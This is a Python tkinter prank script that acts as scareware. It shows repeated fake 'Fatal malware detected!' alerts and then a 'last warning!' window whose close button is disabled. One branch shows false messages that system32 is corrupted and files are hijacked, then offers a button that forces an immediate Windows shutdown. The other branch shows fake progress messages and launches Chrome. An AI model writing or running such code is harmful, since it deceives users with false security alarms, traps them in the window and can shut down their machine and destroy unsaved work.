import os
from tkinter import *
w = Tk()
w.geometry('400x175')
w.title('error!')
w.iconbitmap('error.ico')
w.resizable(False, False)

lb = Label(w, text= 'Fatal malware detected! Take actions immediately')
lb.pack()



w.mainloop()

from tkinter import *
w = Tk()
w.geometry('400x175')
w.title('error!')
w.iconbitmap('error.ico')
w.resizable(False, False)

lb = Label(w, text= 'Fatal malware detected! Take actions immediately')
lb.pack()



w.mainloop()

from tkinter import *
w = Tk()
w.geometry('400x175')
w.title('error!')
w.iconbitmap('error.ico')
w.resizable(False, False)

lb = Label(w, text= 'Fatal malware detected! Take actions immediately')
lb.pack()
w.mainloop()

from tkinter import *
w = Tk()
w.title('last warning!')
w.iconbitmap('error.ico')
w.resizable(False, False)

w.geometry('400x175')
def close_win():
    w.destroy()
def disable_event():
    pass

lb = Label(w, text= 'Do you still want to use this computer?')
lb.pack()

def no():
     for widget in w.winfo_children():
        widget.destroy()
     w.geometry('400x175')
     w.title('error!')
     w.iconbitmap('error.ico')
     w.resizable(False, False)

     lb = Label(w, text= 'starting lagmachine.exe....')
     lb.pack()
     lb = Label(w, text= 'extracting files...')
     lb.pack()
     lb = Label(w, text= 'opening 200 chrome tabs...')
     lb.pack()
     lb = Label(w, text= 'process finished sucsessfully ✅')
     lb.pack()

     btn = Button(w, text= 'Finish', command= finish)
     btn.pack()

     w.after(10000,lambda:w.destroy())
     

def finish():
    num = 1
    for x in range(num):
        os.startfile('C:\Program Files (x86)\Google\Chrome\Application\chrome.exe')
         
def yes():
    for widget in w.winfo_children():
        widget.destroy()
    w.geometry('400x175')
    w.title('error!')
    w.iconbitmap('error.ico')
    w.resizable(False, False)

    lb0 = Label(w, text= 'Hijacking files.....')
    lb0.pack()

    lb1 = Label(w, text= 'Corrupting system32...')
    lb1.pack()

    l = Label(w, text= 'viruz.sys activated, system32 corrupted✅')
    l.pack()


    lb = Label(w, text= 'Proceeding to shutdown.....')
    lb.pack()

    lb = Label(w, text= 'Signing out....')
    lb.pack()

    lb = Label(w, text= 'Processs completed ✅')
    lb.pack()

    btn3 = Button(w, text= 'QUIT NOW', command= shutdown)
    btn3.pack()

btn = Button(w, text= 'Yes', command=yes)
btn.pack()
btn2 = Button(w, text= 'No', command=no)
btn2.pack()

def shutdown():
    os.system("shutdown /s /t 1")

w.protocol("WM_DELETE_WINDOW", disable_event)
w.mainloop()